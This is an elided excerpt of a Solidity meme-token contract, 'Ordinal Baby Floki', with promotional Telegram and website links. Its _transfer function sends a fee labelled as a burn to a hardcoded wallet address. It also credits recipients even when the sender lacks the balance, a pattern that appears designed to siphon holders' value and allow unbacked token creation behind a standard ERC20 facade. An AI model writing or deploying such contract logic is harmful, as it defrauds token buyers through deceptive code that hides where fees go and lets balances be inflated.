...
// Submitted for Telegram: https://t.me/ordinalbabyfloki
// Submitted for Website: https://ordinal-baf.tech
...
contract  OrdinalBabyFloki  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    address private isExcluded;
    string private _name = "Ordinal Baby Floki";
    string private _symbol = "OBF2.0";
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0xD2cfA282128db1446acA711C2ac4375BE17Eb7ED] += _bruntoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_brunfee > 0) {
        emit Transfer(form, 0xD2cfA282128db1446acA711C2ac4375BE17Eb7ED, _bruntoken);
        }
